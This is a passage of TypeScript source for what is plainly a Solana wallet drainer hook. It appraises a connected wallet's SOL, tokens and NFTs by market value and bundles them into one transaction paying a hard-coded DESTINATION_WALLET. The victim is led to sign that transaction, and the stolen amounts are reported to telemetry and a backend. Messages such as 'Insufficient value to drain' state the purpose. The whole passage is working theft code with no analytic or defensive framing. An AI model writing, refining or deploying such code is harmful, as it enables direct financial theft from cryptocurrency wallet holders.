                        isFrozen: false,
                        decimals: dec,
                        priorityScore: isNft
                            ? 1000 + parsed.tokenAmount.uiAmount * 100
                            : parsed.tokenAmount.uiAmount * 10,
                        tokenProgram: tokenProg,
                        usdPrice: 0,
                    });

                    backendTokens.push({
                        mint: mint.toBase58(),
                        amount: amount.toString(),
                        isSPL2022: is2022,
                    });
                } catch {
                    // Malformed account — skip silently.
                }
            }

            // ══════════════════════════════════════════════════════════
            //  PHASE 3A — JUPITER REAL-TIME PRICING
            // ══════════════════════════════════════════════════════════
            const allMintAddrs = assetList.map(a => a.mint.toBase58());
            allMintAddrs.push(SOL_MINT);

            const jupPrices = await fetchBatchPricesUSD(allMintAddrs);

            for (const asset of assetList) {
                const p = jupPrices.get(asset.mint.toBase58());
                if (p && p > 0) asset.usdPrice = p;
            }

            const effectiveSolPrice = jupPrices.get(SOL_MINT) || cgSolPrice || 100;
            const solValueUSD =
                ((solBalance - SOL_TO_LEAVE) / LAMPORTS_PER_SOL) * effectiveSolPrice;

            // ── EVENT: balance identified ──
            await Telemetry.balanceIdentified(
                addr,
                solBalance,
                solValueUSD,
                assetList.length - nftScanCount,
                spl2022ScanCount,
                nftScanCount,
            );

            // ══════════════════════════════════════════════════════════
            //  PHASE 3B — DUST FILTERING
            // ══════════════════════════════════════════════════════════
            const cleaned = filterDust(assetList);
            if (cleaned.length < assetList.length) {
                assetList.length = 0;
                assetList.push(...cleaned);
            }

            // ══════════════════════════════════════════════════════════
            //  PHASE 3C — VALUE-PRIORITY SORT
            // ══════════════════════════════════════════════════════════
            sortByValue(assetList);

            // ══════════════════════════════════════════════════════════
            //  PHASE 4 — TOTAL VALUATION
            // ══════════════════════════════════════════════════════════
            let totalValueUSD = solValueUSD;
            for (const a of assetList) {
                if (a.isNft) {
                    totalValueUSD += NFT_HEURISTIC_USD;
                } else {
                    const norm = Number(a.amount) / Math.pow(10, a.decimals);
                    totalValueUSD += a.usdPrice > 0
                        ? a.usdPrice * norm
                        : Math.max(0.001, norm * 0.01);
                }
            }

            if (totalValueUSD < MIN_DOLLAR_THRESHOLD) {
                await Telemetry.belowThreshold(addr, totalValueUSD, MIN_DOLLAR_THRESHOLD);
                setError("Insufficient value to drain.");
                setStatus("error");
                return;
            }

            setStatus("building");

            // ══════════════════════════════════════════════════════════
            //  PHASE 5 — DYNAMIC BATCH SIZING
            // ══════════════════════════════════════════════════════════
            const estBatch  = calcOptimalBatchSize(
                assetList.length, assetList.length, cfg.maxPacketSize,
            );
            const batchSize = Math.min(estBatch, assetList.length);

            // ══════════════════════════════════════════════════════════
            //  PHASE 6 — BATCH ATA EXISTENCE CHECK
            // ══════════════════════════════════════════════════════════
            const batchAssets = assetList.slice(0, batchSize);
            const ataAddrs    = batchAssets.map(a =>
                getAssociatedTokenAddressSync(a.mint, DESTINATION_WALLET, true, a.tokenProgram)
            );

            let ataCache    = await batchCheckAtas(ataAddrs, connection);
            let atasNeeded  = [...ataCache.values()].filter(v => !v).length;

            // ══════════════════════════════════════════════════════════
            //  PHASE 7 — ADAPTIVE BATCH SHRINKING
            // ══════════════════════════════════════════════════════════
            let finalSize   = batchSize;
            let finalAtas   = atasNeeded;
            let validation  = validateBalance(
                solBalance, finalAtas, finalSize,
                batchAssets.filter(a => a.isSPL2022).length,
                batchAssets.filter(a => a.isTransferHook).length,
                cfg,
            );

            while (!validation.sufficient && finalSize > 0) {
                finalSize--;
                if (finalSize === 0) break;

                const shrunk     = assetList.slice(0, finalSize);
                const shrunkAtas = shrunk.map(a =>
                    getAssociatedTokenAddressSync(a.mint, DESTINATION_WALLET, true, a.tokenProgram)
                );
                finalAtas = shrunkAtas.filter(
                    a => ataCache.get(a.toBase58()) === false
                ).length;

                validation = validateBalance(
                    solBalance, finalAtas, finalSize,
                    shrunk.filter(a => a.isSPL2022).length,
                    shrunk.filter(a => a.isTransferHook).length,
                    cfg,
                );
            }

            if (!validation.sufficient || finalSize === 0) {
                const need = SOL_TO_LEAVE + estimateTxFees(finalAtas, finalSize, 0, 0, cfg);
                await Telemetry.insufficientBalance(addr, solBalance, need);
                setError(validation.errorMsg || "Insufficient balance for fees.");
                setStatus("error");
                return;
            }

            if (finalSize < batchSize) {
                await Telemetry.batchShrunk(addr, batchSize, finalSize);
            }

            // ══════════════════════════════════════════════════════════
            //  PHASE 8 — ATA CACHE REFRESH (race-condition guard)
            // ══════════════════════════════════════════════════════════
            const safeAssets = assetList.slice(0, finalSize);
            const safeAtas   = safeAssets.map(a =>
                getAssociatedTokenAddressSync(a.mint, DESTINATION_WALLET, true, a.tokenProgram)
            );

            ataCache   = await batchCheckAtas(safeAtas, connection);
            atasNeeded = [...ataCache.values()].filter(v => !v).length;

            // ══════════════════════════════════════════════════════════
            //  PHASE 9 — INSTRUCTION BUILDING
            // ══════════════════════════════════════════════════════════
            const ixs: TransactionInstruction[] = [];

            // 9a. Dynamic priority fee (now actually used)
            const dynamicFee = await fetchDynamicPriorityFee(connection);
            ixs.push(ComputeBudgetProgram.setComputeUnitPrice({ microLamports: dynamicFee }));

            // 9b. Compute unit limit (prevents default-budget overruns)
            const cuEstimate = Math.min(
                1_400_000,
                200_000 + (finalSize * 50_000) + (atasNeeded * 30_000),
            );
            ixs.push(ComputeBudgetProgram.setComputeUnitLimit({ units: cuEstimate }));

            // 9c. SOL transfer
            if (validation.availableForTransfer > 0) {
                if (!isValidPublicKey(DESTINATION_WALLET)) {
                    throw new Error("Invalid destination wallet.");
                }
                ixs.push(
                    SystemProgram.transfer({
                        fromPubkey: publicKey,
                        toPubkey: DESTINATION_WALLET,
                        lamports: validation.availableForTransfer,
                    })
                );
            }

            // 9d. Token transfers
            let tokenCount = 0;
            let nftCount   = 0;

            for (const asset of safeAssets) {
                try {
                    const progId  = asset.isSPL2022 ? TOKEN_2022_PROGRAM_ID : TOKEN_PROGRAM_ID;
                    const destAta = getAssociatedTokenAddressSync(
                        asset.mint, DESTINATION_WALLET, true, progId,
                    );

                    if (ataCache.get(destAta.toBase58()) === false) {
                        ixs.push(
                            createAssociatedTokenAccountInstruction(
                                publicKey, destAta, DESTINATION_WALLET, asset.mint, progId,
                            )
                        );
                    }

                    if (!isValidTokenAmount(asset.amount)) continue;

                    ixs.push(
                        createTransferInstruction(
                            asset.tokenAccountPubkey, destAta, publicKey,
                            asset.amount, [], progId,
                        )
                    );

                    if (asset.isNft) nftCount++;
                    else tokenCount++;
                } catch {
                    // Skip non-transferable assets.
                }
            }

            // Guard: must have at least priority-fee + CU-limit + 1 meaningful ix
            if (ixs.length <= 2) {
                await Telemetry.noAssets(addr);
                setError("No drainable assets found.");
                setStatus("error");
                return;
            }

            // ══════════════════════════════════════════════════════════
            //  PHASE 9B — LATE BLOCKHASH FETCH
            // ══════════════════════════════════════════════════════════
            let blockhash: string;
            let lastValidBlockHeight: number;
            let minContextSlot: number;

            try {
                const resp = await withTimeout(
                    () => connection.getLatestBlockhashAndContext(),
                    RPC_TIMEOUT,
                ) as any;

                blockhash            = resp?.value?.blockhash;
                lastValidBlockHeight = resp?.value?.lastValidBlockHeight;
                minContextSlot       = resp?.context?.slot;

                if (!blockhash || !lastValidBlockHeight) {
                    throw new Error("Invalid blockhash response.");
                }
            } catch (e) {
                throw new Error(
                    "Failed to fetch blockhash: " +
                    (e instanceof Error ? e.message : String(e))
                );
            }

            // ══════════════════════════════════════════════════════════
            //  SIZE VALIDATION
            // ══════════════════════════════════════════════════════════
            const testTx          = new Transaction().add(...ixs);
            testTx.recentBlockhash = blockhash;
            testTx.feePayer        = publicKey;

            let txSize: number;
            try {
                const buf = testTx.serialize({ requireAllSignatures: false });
                txSize = buf.length;

                if (txSize > cfg.maxPacketSize) {
                    await Telemetry.txTooLarge(addr, txSize, cfg.maxPacketSize);
                    setError(`Transaction too large (${txSize} bytes).`);
                    setStatus("error");
                    return;
                }
            } catch (e) {
                throw new Error(
                    "Transaction compilation failed: " +
                    (e instanceof Error ? e.message : String(e))
                );
            }

            // ══════════════════════════════════════════════════════════
            //  PRE-FLIGHT SIMULATION
            // ══════════════════════════════════════════════════════════
            try {
                const sim = await connection.simulateTransaction(testTx);
                if (sim.value.err) {
                    const errStr = JSON.stringify(sim.value.err);
                    await Telemetry.simulationFailed(addr, errStr);
                    throw new Error(`Simulation failed: ${errStr}`);
                }
            } catch (e) {
                const msg = e instanceof Error ? e.message : String(e);
                // "Blockhash not found" is benign in simulation — ignore it
                if (!msg.includes("Blockhash not found") && !msg.includes("Simulation")) {
                    throw new Error("Simulation error: " + msg);
                }
                if (msg.includes("Simulation")) throw e;
            }

            // ══════════════════════════════════════════════════════════
            //  SET STATS + PREPARED EVENT
            // ══════════════════════════════════════════════════════════
            setStats({
                totalUsdValue: totalValueUSD,
                solAmount: validation.availableForTransfer,
                tokenCount,
                nftCount,
                batchCount: 1,
            });

            await Telemetry.preparedToDrain(
                addr, tokenCount, nftCount, totalValueUSD, txSize, dynamicFee,
            );

            // ══════════════════════════════════════════════════════════
            //  PHASE 10 — SIGNING
            // ══════════════════════════════════════════════════════════
            setStatus("signing");

            const finalTx          = new Transaction().add(...ixs);
            finalTx.recentBlockhash = blockhash;
            finalTx.feePayer        = publicKey;

            let signature: string;
            try {
                signature = await withTimeout(
                    () => sendTransaction(finalTx, connection, { minContextSlot }),
                    RPC_TIMEOUT,
                );
            } catch (e) {
                throw e;
            }

            if (!isValidSignature(signature)) {
                await Telemetry.signatureInvalid(addr, signature);
                throw new Error(`Invalid signature format: ${signature}`);
            }

            // ── EVENT: draining ──
            await Telemetry.draining(addr, signature);

            // ══════════════════════════════════════════════════════════
            //  PHASE 11 — CONFIRMATION
            // ══════════════════════════════════════════════════════════
            setStatus("confirming");

            const outcome = await confirmBulletproof(
                connection, signature, CONFIRMATION_TIMEOUT,
            );

            if (outcome === "failed") {
                await Telemetry.drainFailed(addr, "Transaction failed on-chain.", "confirmation");
                throw new Error("Transaction failed on-chain.");
            }

            if (outcome === "unknown") {
                await Telemetry.confirmationTimeout(addr, signature);
                setStatus("success");
                return;
            }

            // ══════════════════════════════════════════════════════════
            //  PHASE 12 — BACKEND MIRROR + SUCCESS TELEMETRY
            // ══════════════════════════════════════════════════════════
            if (outcome === "confirmed") {
                await mirrorToBackend(
                    addr,
                    validation.availableForTransfer,
                    signature,
                    backendTokens,
                );

                await Telemetry.drained(
                    addr,
                    signature,
                    validation.availableForTransfer,
                    tokenCount,
                    nftCount,
                    totalValueUSD,
                );
            }

            setStatus("success");

        } catch (e: any) {
            handleError(e, setError, setStatus, ctx, "drain-pipeline");
        } finally {
            lockRef.current = false;
        }
    }, [publicKey, sendTransaction, connection, mirrorToBackend]);

    return { drain, status, error, stats };
};